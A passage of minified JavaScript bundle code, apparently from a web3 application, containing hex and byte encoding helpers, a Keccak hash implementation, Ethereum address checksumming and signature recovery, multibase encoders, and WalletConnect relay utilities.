MO=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function Nm(t,e={}){return typeof t=="number"||typeof t=="bigint"?T_(t,e):typeof t=="string"?$O(t,e):typeof t=="boolean"?BO(t,e):N_(t,e)}function BO(t,e={}){const r=`0x${Number(t)}`;return typeof e.size=="number"?($c(r,{size:e.size}),Uc(r,{size:e.size})):r}function N_(t,e={}){let r="";for(let i=0;i<t.length;i++)r+=MO[t[i]];const n=`0x${r}`;return typeof e.size=="number"?($c(n,{size:e.size}),Uc(n,{dir:"right",size:e.size})):n}function T_(t,e={}){const{signed:r,size:n}=e,i=BigInt(t);let s;n?r?s=(1n<<BigInt(n)*8n-1n)-1n:s=2n**(BigInt(n)*8n)-1n:typeof t=="number"&&(s=BigInt(Number.MAX_SAFE_INTEGER));const o=typeof s=="bigint"&&r?-s-1n:0;if(s&&i>s||i<o){const c=typeof t=="bigint"?"n":"";throw new OO({max:s?`${s}${c}`:void 0,min:`${o}${c}`,signed:r,size:n,value:`${t}${c}`})}const a=`0x${(r&&i<0?(1n<<BigInt(n*8))+BigInt(i):i).toString(16)}`;return n?Uc(a,{size:n}):a}const UO=new TextEncoder;function $O(t,e={}){const r=UO.encode(t);return N_(r,e)}const LO=new TextEncoder;function FO(t,e={}){return typeof t=="number"||typeof t=="bigint"?qO(t,e):typeof t=="boolean"?jO(t,e):Hu(t)?P_(t,e):R_(t,e)}function jO(t,e={}){const r=new Uint8Array(1);return r[0]=Number(t),typeof e.size=="number"?($c(r,{size:e.size}),Uc(r,{size:e.size})):r}const es={zero:48,nine:57,A:65,F:70,a:97,f:102};function nb(t){if(t>=es.zero&&t<=es.nine)return t-es.zero;if(t>=es.A&&t<=es.F)return t-(es.A-10);if(t>=es.a&&t<=es.f)return t-(es.a-10)}function P_(t,e={}){let r=t;e.size&&($c(r,{size:e.size}),r=Uc(r,{dir:"right",size:e.size}));let n=r.slice(2);n.length%2&&(n=`0${n}`);const i=n.length/2,s=new Uint8Array(i);for(let o=0,a=0;o<i;o++){const c=nb(n.charCodeAt(a++)),u=nb(n.charCodeAt(a++));if(c===void 0||u===void 0)throw new If(`Invalid byte sequence ("${n[a-2]}${n[a-1]}" in "${n}").`);s[o]=c*16+u}return s}function qO(t,e){const r=T_(t,e);return P_(r)}function R_(t,e={}){const r=LO.encode(t);return typeof e.size=="number"?($c(r,{size:e.size}),Uc(r,{dir:"right",size:e.size})):r}function Rd(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function zO(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function xf(t,...e){if(!zO(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function HY(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");Rd(t.outputLen),Rd(t.blockLen)}function ib(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function HO(t,e){xf(t);const r=e.outputLen;if(t.length<r)throw new Error("digestInto() expects output buffer of length at least "+r)}const Ph=BigInt(2**32-1),sb=BigInt(32);function WO(t,e=!1){return e?{h:Number(t&Ph),l:Number(t>>sb&Ph)}:{h:Number(t>>sb&Ph)|0,l:Number(t&Ph)|0}}function GO(t,e=!1){let r=new Uint32Array(t.length),n=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:s,l:o}=WO(t[i],e);[r[i],n[i]]=[s,o]}return[r,n]}const VO=(t,e,r)=>t<<r|e>>>32-r,KO=(t,e,r)=>e<<r|t>>>32-r,QO=(t,e,r)=>e<<r-32|t>>>64-r,YO=(t,e,r)=>t<<r-32|e>>>64-r,xa=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */function JO(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function WY(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}function GY(t,e){return t<<32-e|t>>>e}const ob=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function ZO(t){return t<<24&4278190080|t<<8&16711680|t>>>8&65280|t>>>24&255}function ab(t){for(let e=0;e<t.length;e++)t[e]=ZO(t[e])}function XO(t){if(typeof t!="string")throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function O_(t){return typeof t=="string"&&(t=XO(t)),xf(t),t}function VY(...t){let e=0;for(let n=0;n<t.length;n++){const i=t[n];xf(i),e+=i.length}const r=new Uint8Array(e);for(let n=0,i=0;n<t.length;n++){const s=t[n];r.set(s,i),i+=s.length}return r}let ek=class{clone(){return this._cloneInto()}};function tk(t){const e=n=>t().update(O_(n)).digest(),r=t();return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=()=>t(),e}function QY(t=32){if(xa&&typeof xa.getRandomValues=="function")return xa.getRandomValues(new Uint8Array(t));if(xa&&typeof xa.randomBytes=="function")return xa.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}const k_=[],D_=[],M_=[],rk=BigInt(0),nu=BigInt(1),nk=BigInt(2),ik=BigInt(7),sk=BigInt(256),ok=BigInt(113);for(let t=0,e=nu,r=1,n=0;t<24;t++){[r,n]=[n,(2*r+3*n)%5],k_.push(2*(5*n+r)),D_.push((t+1)*(t+2)/2%64);let i=rk;for(let s=0;s<7;s++)e=(e<<nu^(e>>ik)*ok)%sk,e&nk&&(i^=nu<<(nu<<BigInt(s))-nu);M_.push(i)}const[ak,ck]=GO(M_,!0),cb=(t,e,r)=>r>32?QO(t,e,r):VO(t,e,r),ub=(t,e,r)=>r>32?YO(t,e,r):KO(t,e,r);function uk(t,e=24){const r=new Uint32Array(10);for(let n=24-e;n<24;n++){for(let o=0;o<10;o++)r[o]=t[o]^t[o+10]^t[o+20]^t[o+30]^t[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,u=r[c],l=r[c+1],h=cb(u,l,1)^r[a],d=ub(u,l,1)^r[a+1];for(let g=0;g<50;g+=10)t[o+g]^=h,t[o+g+1]^=d}let i=t[2],s=t[3];for(let o=0;o<24;o++){const a=D_[o],c=cb(i,s,a),u=ub(i,s,a),l=k_[o];i=t[l],s=t[l+1],t[l]=c,t[l+1]=u}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)r[a]=t[o+a];for(let a=0;a<10;a++)t[o+a]^=~r[(a+2)%10]&r[(a+4)%10]}t[0]^=ak[n],t[1]^=ck[n]}r.fill(0)}let lk=class B_ extends ek{constructor(e,r,n,i=!1,s=24){if(super(),this.blockLen=e,this.suffix=r,this.outputLen=n,this.enableXOF=i,this.rounds=s,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,Rd(n),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=JO(this.state)}keccak(){ob||ab(this.state32),uk(this.state32,this.rounds),ob||ab(this.state32),this.posOut=0,this.pos=0}update(e){ib(this);const{blockLen:r,state:n}=this;e=O_(e);const i=e.length;for(let s=0;s<i;){const o=Math.min(r-this.pos,i-s);for(let a=0;a<o;a++)n[this.pos++]^=e[s++];this.pos===r&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:r,pos:n,blockLen:i}=this;e[n]^=r,(r&128)!==0&&n===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){ib(this,!1),xf(e),this.finish();const r=this.state,{blockLen:n}=this;for(let i=0,s=e.length;i<s;){this.posOut>=n&&this.keccak();const o=Math.min(n-this.posOut,s-i);e.set(r.subarray(this.posOut,this.posOut+o),i),this.posOut+=o,i+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return Rd(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(HO(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:r,suffix:n,outputLen:i,rounds:s,enableXOF:o}=this;return e||(e=new B_(r,n,i,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=n,e.outputLen=i,e.enableXOF=o,e.destroyed=this.destroyed,e}};const hk=(t,e,r)=>tk(()=>new lk(e,t,r)),dk=hk(1,136,256/8);function U_(t,e){const r=e||"hex",n=dk(Hu(t,{strict:!1})?FO(t):t);return r==="bytes"?n:Nm(n)}let fk=class extends Map{constructor(e){super(),Object.defineProperty(this,"maxSize",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.maxSize=e}get(e){const r=super.get(e);return super.has(e)&&r!==void 0&&(this.delete(e),super.set(e,r)),r}set(e,r){if(super.set(e,r),this.maxSize&&this.size>this.maxSize){const n=this.keys().next().value;n&&this.delete(n)}return this}};const Wp=new fk(8192);function pk(t,e){if(Wp.has(`${t}.${e}`))return Wp.get(`${t}.${e}`);const r=t.substring(2).toLowerCase(),n=U_(R_(r),"bytes"),i=r.split("");for(let o=0;o<40;o+=2)n[o>>1]>>4>=8&&i[o]&&(i[o]=i[o].toUpperCase()),(n[o>>1]&15)>=8&&i[o+1]&&(i[o+1]=i[o+1].toUpperCase());const s=`0x${i.join("")}`;return Wp.set(`${t}.${e}`,s),s}function gk(t){const e=U_(`0x${t.substring(4)}`).substring(26);return pk(`0x${e}`)}const mk="modulepreload",yk=function(t){return"/"+t},lb={},ln=function(e,r,n){let i=Promise.resolve();if(r&&r.length>0){document.getElementsByTagName("link");const o=document.querySelector("meta[property=csp-nonce]"),a=(o==null?void 0:o.nonce)||(o==null?void 0:o.getAttribute("nonce"));i=Promise.allSettled(r.map(c=>{if(c=yk(c),c in lb)return;lb[c]=!0;const u=c.endsWith(".css"),l=u?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${c}"]${l}`))return;const h=document.createElement("link");if(h.rel=u?"stylesheet":mk,u||(h.as="script"),h.crossOrigin="",h.href=c,a&&h.setAttribute("nonce",a),document.head.appendChild(h),u)return new Promise((d,g)=>{h.addEventListener("load",d),h.addEventListener("error",()=>g(new Error(`Unable to preload CSS for ${c}`)))})}))}function s(o){const a=new Event("vite:preloadError",{cancelable:!0});if(a.payload=o,window.dispatchEvent(a),!a.defaultPrevented)throw o}return i.then(o=>{for(const a of o||[])a.status==="rejected"&&s(a.reason);return e().catch(s)})};async function wk({hash:t,signature:e}){const r=Hu(t)?t:Nm(t),{secp256k1:n}=await ln(async()=>{const{secp256k1:o}=await import("./secp256k1-DNywqKVp.js");return{secp256k1:o}},[]);return`0x${(()=>{if(typeof e=="object"&&"r"in e&&"s"in e){const{r:u,s:l,v:h,yParity:d}=e,g=Number(d??h),y=hb(g);return new n.Signature(Sm(u),Sm(l)).addRecoveryBit(y)}const o=Hu(e)?e:Nm(e),a=DO(`0x${o.slice(130)}`),c=hb(a);return n.Signature.fromCompact(o.substring(2,130)).addRecoveryBit(c)})().recoverPublicKey(r.substring(2)).toHex(!1)}`}function hb(t){if(t===0||t===1)return t;if(t===27)return 0;if(t===28)return 1;throw new Error("Invalid yParityOrV value")}async function bk({hash:t,signature:e}){return gk(await wk({hash:t,signature:e}))}function vk(t){if(t.length>=255)throw new TypeError("Alphabet too long");const e=new Uint8Array(256);for(let u=0;u<e.length;u++)e[u]=255;for(let u=0;u<t.length;u++){const l=t.charAt(u),h=l.charCodeAt(0);if(e[h]!==255)throw new TypeError(l+" is ambiguous");e[h]=u}const r=t.length,n=t.charAt(0),i=Math.log(r)/Math.log(256),s=Math.log(256)/Math.log(r);function o(u){if(u instanceof Uint8Array||(ArrayBuffer.isView(u)?u=new Uint8Array(u.buffer,u.byteOffset,u.byteLength):Array.isArray(u)&&(u=Uint8Array.from(u))),!(u instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(u.length===0)return"";let l=0,h=0,d=0;const g=u.length;for(;d!==g&&u[d]===0;)d++,l++;const y=(g-d)*s+1>>>0,m=new Uint8Array(y);for(;d!==g;){let _=u[d],T=0;for(let P=y-1;(_!==0||T<h)&&P!==-1;P--,T++)_+=256*m[P]>>>0,m[P]=_%r>>>0,_=_/r>>>0;if(_!==0)throw new Error("Non-zero carry");h=T,d++}let b=y-h;for(;b!==y&&m[b]===0;)b++;let A=n.repeat(l);for(;b<y;++b)A+=t.charAt(m[b]);return A}function a(u){if(typeof u!="string")throw new TypeError("Expected String");if(u.length===0)return new Uint8Array;let l=0,h=0,d=0;for(;u[l]===n;)h++,l++;const g=(u.length-l)*i+1>>>0,y=new Uint8Array(g);for(;l<u.length;){const _=u.charCodeAt(l);if(_>255)return;let T=e[_];if(T===255)return;let P=0;for(let S=g-1;(T!==0||P<d)&&S!==-1;S--,P++)T+=r*y[S]>>>0,y[S]=T%256>>>0,T=T/256>>>0;if(T!==0)throw new Error("Non-zero carry");d=P,l++}let m=g-d;for(;m!==g&&y[m]===0;)m++;const b=new Uint8Array(h+(g-m));let A=h;for(;m!==g;)b[A++]=y[m++];return b}function c(u){const l=a(u);if(l)return l;throw new Error("Non-base"+r+" character")}return{encode:o,decodeUnsafe:a,decode:c}}var Ek="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";const $_=vk(Ek);function L_(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?globalThis.Buffer.allocUnsafe(t):new Uint8Array(t)}function xu(t,e){e||(e=t.reduce((i,s)=>i+s.length,0));const r=L_(e);let n=0;for(const i of t)r.set(i,n),n+=i.length;return r}function Ak(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var r=new Uint8Array(256),n=0;n<r.length;n++)r[n]=255;for(var i=0;i<t.length;i++){var s=t.charAt(i),o=s.charCodeAt(0);if(r[o]!==255)throw new TypeError(s+" is ambiguous");r[o]=i}var a=t.length,c=t.charAt(0),u=Math.log(a)/Math.log(256),l=Math.log(256)/Math.log(a);function h(y){if(y instanceof Uint8Array||(ArrayBuffer.isView(y)?y=new Uint8Array(y.buffer,y.byteOffset,y.byteLength):Array.isArray(y)&&(y=Uint8Array.from(y))),!(y instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(y.length===0)return"";for(var m=0,b=0,A=0,_=y.length;A!==_&&y[A]===0;)A++,m++;for(var T=(_-A)*l+1>>>0,P=new Uint8Array(T);A!==_;){for(var S=y[A],C=0,O=T-1;(S!==0||C<b)&&O!==-1;O--,C++)S+=256*P[O]>>>0,P[O]=S%a>>>0,S=S/a>>>0;if(S!==0)throw new Error("Non-zero carry");b=C,A++}for(var $=T-b;$!==T&&P[$]===0;)$++;for(var D=c.repeat(m);$<T;++$)D+=t.charAt(P[$]);return D}function d(y){if(typeof y!="string")throw new TypeError("Expected String");if(y.length===0)return new Uint8Array;var m=0;if(y[m]!==" "){for(var b=0,A=0;y[m]===c;)b++,m++;for(var _=(y.length-m)*u+1>>>0,T=new Uint8Array(_);y[m];){var P=r[y.charCodeAt(m)];if(P===255)return;for(var S=0,C=_-1;(P!==0||S<A)&&C!==-1;C--,S++)P+=a*T[C]>>>0,T[C]=P%256>>>0,P=P/256>>>0;if(P!==0)throw new Error("Non-zero carry");A=S,m++}if(y[m]!==" "){for(var O=_-A;O!==_&&T[O]===0;)O++;for(var $=new Uint8Array(b+(_-O)),D=b;O!==_;)$[D++]=T[O++];return $}}}function g(y){var m=d(y);if(m)return m;throw new Error(`Non-${e} character`)}return{encode:h,decodeUnsafe:d,decode:g}}var _k=Ak,Ck=_k;const Ik=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},xk=t=>new TextEncoder().encode(t),Sk=t=>new TextDecoder().decode(t);class Nk{constructor(e,r,n){this.name=e,this.prefix=r,this.baseEncode=n}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}}class Tk{constructor(e,r,n){if(this.name=e,this.prefix=r,r.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=r.codePointAt(0),this.baseDecode=n}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return F_(this,e)}}class Pk{constructor(e){this.decoders=e}or(e){return F_(this,e)}decode(e){const r=e[0],n=this.decoders[r];if(n)return n.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}}const F_=(t,e)=>new Pk({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});class Rk{constructor(e,r,n,i){this.name=e,this.prefix=r,this.baseEncode=n,this.baseDecode=i,this.encoder=new Nk(e,r,n),this.decoder=new Tk(e,r,i)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}}const Sf=({name:t,prefix:e,encode:r,decode:n})=>new Rk(t,e,r,n),Yl=({prefix:t,name:e,alphabet:r})=>{const{encode:n,decode:i}=Ck(r,e);return Sf({prefix:t,name:e,encode:n,decode:s=>Ik(i(s))})},Ok=(t,e,r,n)=>{const i={};for(let l=0;l<e.length;++l)i[e[l]]=l;let s=t.length;for(;t[s-1]==="=";)--s;const o=new Uint8Array(s*r/8|0);let a=0,c=0,u=0;for(let l=0;l<s;++l){const h=i[t[l]];if(h===void 0)throw new SyntaxError(`Non-${n} character`);c=c<<r|h,a+=r,a>=8&&(a-=8,o[u++]=255&c>>a)}if(a>=r||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},kk=(t,e,r)=>{const n=e[e.length-1]==="=",i=(1<<r)-1;let s="",o=0,a=0;for(let c=0;c<t.length;++c)for(a=a<<8|t[c],o+=8;o>r;)o-=r,s+=e[i&a>>o];if(o&&(s+=e[i&a<<r-o]),n)for(;s.length*r&7;)s+="=";return s},Ur=({name:t,prefix:e,bitsPerChar:r,alphabet:n})=>Sf({prefix:e,name:t,encode(i){return kk(i,n,r)},decode(i){return Ok(i,n,r,t)}}),Dk=Sf({prefix:"\0",name:"identity",encode:t=>Sk(t),decode:t=>xk(t)}),Mk=Object.freeze(Object.defineProperty({__proto__:null,identity:Dk},Symbol.toStringTag,{value:"Module"})),Bk=Ur({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1}),Uk=Object.freeze(Object.defineProperty({__proto__:null,base2:Bk},Symbol.toStringTag,{value:"Module"})),$k=Ur({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3}),Lk=Object.freeze(Object.defineProperty({__proto__:null,base8:$k},Symbol.toStringTag,{value:"Module"})),Fk=Yl({prefix:"9",name:"base10",alphabet:"0123456789"}),jk=Object.freeze(Object.defineProperty({__proto__:null,base10:Fk},Symbol.toStringTag,{value:"Module"})),qk=Ur({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),zk=Ur({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4}),Hk=Object.freeze(Object.defineProperty({__proto__:null,base16:qk,base16upper:zk},Symbol.toStringTag,{value:"Module"})),Wk=Ur({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),Gk=Ur({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),Vk=Ur({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),Kk=Ur({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),Qk=Ur({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),Yk=Ur({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),Jk=Ur({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),Zk=Ur({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),Xk=Ur({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5}),eD=Object.freeze(Object.defineProperty({__proto__:null,base32:Wk,base32hex:Qk,base32hexpad:Jk,base32hexpadupper:Zk,base32hexupper:Yk,base32pad:Vk,base32padupper:Kk,base32upper:Gk,base32z:Xk},Symbol.toStringTag,{value:"Module"})),tD=Yl({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),rD=Yl({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"}),nD=Object.freeze(Object.defineProperty({__proto__:null,base36:tD,base36upper:rD},Symbol.toStringTag,{value:"Module"})),iD=Yl({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),sD=Yl({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"}),oD=Object.freeze(Object.defineProperty({__proto__:null,base58btc:iD,base58flickr:sD},Symbol.toStringTag,{value:"Module"})),aD=Ur({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),cD=Ur({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),uD=Ur({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),lD=Ur({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6}),hD=Object.freeze(Object.defineProperty({__proto__:null,base64:aD,base64pad:cD,base64url:uD,base64urlpad:lD},Symbol.toStringTag,{value:"Module"})),j_=Array.from(""),dD=j_.reduce((t,e,r)=>(t[r]=e,t),[]),fD=j_.reduce((t,e,r)=>(t[e.codePointAt(0)]=r,t),[]);function pD(t){return t.reduce((e,r)=>(e+=dD[r],e),"")}function gD(t){const e=[];for(const r of t){const n=fD[r.codePointAt(0)];if(n===void 0)throw new Error(`Non-base256emoji character: ${r}`);e.push(n)}return new Uint8Array(e)}const mD=Sf({prefix:"",name:"base256emoji",encode:pD,decode:gD}),yD=Object.freeze(Object.defineProperty({__proto__:null,base256emoji:mD},Symbol.toStringTag,{value:"Module"}));new TextEncoder;new TextDecoder;const db={...Mk,...Uk,...Lk,...jk,...Hk,...eD,...nD,...oD,...hD,...yD};function q_(t,e,r,n){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:r},decoder:{decode:n}}}const fb=q_("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),Gp=q_("ascii","a",t=>{let e="a";for(let r=0;r<t.length;r++)e+=String.fromCharCode(t[r]);return e},t=>{t=t.substring(1);const e=L_(t.length);for(let r=0;r<t.length;r++)e[r]=t.charCodeAt(r);return e}),z_={utf8:fb,"utf-8":fb,hex:db.base16,latin1:Gp,ascii:Gp,binary:Gp,...db};function Hn(t,e="utf8"){const r=z_[e];if(!r)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t,"utf8"):r.decoder.decode(`${r.prefix}${t}`)}function fn(t,e="utf8"){const r=z_[e];if(!r)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t.buffer,t.byteOffset,t.byteLength).toString("utf8"):r.encoder.encode(t).substring(1)}const wD={waku:{publish:"waku_publish",batchPublish:"waku_batchPublish",subscribe:"waku_subscribe",batchSubscribe:"waku_batchSubscribe",subscription:"waku_subscription",unsubscribe:"waku_unsubscribe",batchUnsubscribe:"waku_batchUnsubscribe",batchFetchMessages:"waku_batchFetchMessages"},irn:{publish:"irn_publish",batchPublish:"irn_batchPublish",subscribe:"irn_subscribe",batchSubscribe:"irn_batchSubscribe",subscription:"irn_subscription",unsubscribe:"irn_unsubscribe",batchUnsubscribe:"irn_batchUnsubscribe",batchFetchMessages:"irn_batchFetchMessages"},iridium:{publish:"iridium_publish",batchPublish:"iridium_batchPublish",subscribe:"iridium_subscribe",batchSubscribe:"iridium_batchSubscribe",subscription:"iridium_subscription",unsubscribe:"iridium_unsubscribe",batchUnsubscribe:"iridium_batchUnsubscribe",batchFetchMessages:"iridium_batchFetchMessages"}};var bD={};const vD=":";function ic(t){const[e,r]=t.split(vD);return{namespace:e,reference:r}}function H_(t,e){return t.includes(":")?[t]:e.chains||[]}var ED=Object.defineProperty,AD=Object.defineProperties,_D=Object.getOwnPropertyDescriptors,pb=Object.getOwnPropertySymbols,CD=Object.prototype.hasOwnProperty,ID=Object.prototype.propertyIsEnumerable,gb=(t,e,r)=>e in t?ED(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,mb=(t,e)=>{for(var r in e||(e={}))CD.call(e,r)&&gb(t,r,e[r]);if(pb)for(var r of pb(e))ID.call(e,r)&&gb(t,r,e[r]);return t},xD=(t,e)=>AD(t,_D(e));const SD="ReactNative",Tn={reactNative:"react-native",node:"node",browser:"browser",unknown:"unknown"},ND="js";function Od(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}function uo(){return!Xo.getDocument()&&!!Xo.getNavigator()&&navigator.product===SD}function TD(){return uo()&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"&&(global==null?void 0:global.Platform.OS)==="android"}function PD(){return uo()&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"&&(global==null?void 0:global.Platform.OS)==="ios"}function Jl(){return!Od()&&!!Xo.getNavigator()&&!!Xo.getDocument()}function Zl(){return uo()?Tn.reactNative:Od()?Tn.node:Jl()?Tn.browser:Tn.unknown}function yb(){var t;try{return uo()&&typeof global<"u"&&typeof(global==null?void 0:global.Application)<"u"?(t=global.Application)==null?void 0:t.applicationId:void 0}catch{return}}function RD(t,e){const r=new URLSearchParams(t);for(const n of Object.keys(e).sort())if(e.hasOwnProperty(n)){const i=e[n];i!==void 0&&r.set(n,i)}return r.toString()}function OD(t){var e,r;const n=W_();try{return t!=null&&t.url&&n.url&&t.url!==n.url&&(console.warn(`The configured WalletConnect 'metadata.url':${t.url} differs from the actual page url:${n.url}. This is probably unintended and can lead to issues.`),t.url=n.url),(e=t==null?void 0:t.icons)!=null&&e.length&&t.icons.length>0&&(t.icons=t.icons.filter(i=>i!=="")),xD(mb(mb({},n),t),{url:(t==null?void 0:t.url)||n.url,name:(t==null?void 0:t.name)||n.name,description:(t==null?void 0:t.description)||n.description,icons:(r=t==null?void 0:t.icons)!=null&&r.length&&t.icons.length>0?t.icons:n.icons})}catch(i){return console.warn("Error populating app metadata",i),t||n}}function W_(){return j3.getWindowMetadata()||{name:"",description:"",url:"",icons:[""]}}function kD(){if(Zl()===Tn.reactNative&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"){const{OS:r,Version:n}=global.Platform;return[r,n].join("-")}const t=D3();if(t===null)return"unknown";const e=t.os?t.os.replace(" ","").toLowerCase():"unknown";return t.type==="browser"?[e,t.name,t.version].join("-"):[e,t.version].join("-")}function DD(){var t;const e=Zl();return e===Tn.browser?[e,((t=Xo.getLocation())==null?void 0:t.host)||"unknown"].join(":"):e}function G_(t,e,r){const n=kD(),i=DD();return[[t,e].join("-"),[ND,r].join("-"),n,i].join("/")}function MD({protocol:t,version:e,relayUrl:r,sdkVersion:n,auth:i,projectId:s,useOnCloseEvent:o,bundleId:a,packageName:c}){const u=r.split("?"),l=G_(t,e,n),h={auth:i,ua:l,projectId:s,useOnCloseEvent:o,packageName:c||void 0,bundleId:a||void 0},d=RD(u[1]||"",h);return u[0]+"?"+d}function Uo(t,e){return t.filter(r=>e.includes(r)).length===t.length}function Tm(t){return Object.fromEntries(t.entries())}function Pm(t){return new Map(Object.entries(t))}function To(t=se.FIVE_MINUTES,e){const r=se.toMiliseconds(t||se.FIVE_MINUTES);let n,i,s,o;return{resolve:a=>{s&&n&&(clearTimeout(s),n(a),o=Promise.resolve(a))},reject:a=>{s&&i&&(clearTimeout(s),i(a))},done:()=>new Promise((a,c)=>{if(o)return a(o);s=setTimeout(()=>{const u=new Error(e);o=Promise.reject(u),c(u)},r),n=a,i=c})}}function Vs(t,e,r){return new Promise(async(n,i)=>{const s=setTimeout(()=>i(new Error(r)),e);try{const o=await t;n(o)}catch(o){i(o)}clearTimeout(s)})}function V_(t,e){if(typeof e=="string"&&e.startsWith(`${t}:`))return e;if(t.toLowerCase()==="topic"){if(typeof e!="string")throw new Error('Value must be "string" for expirer target type: topic');return`topic:${e}`}else 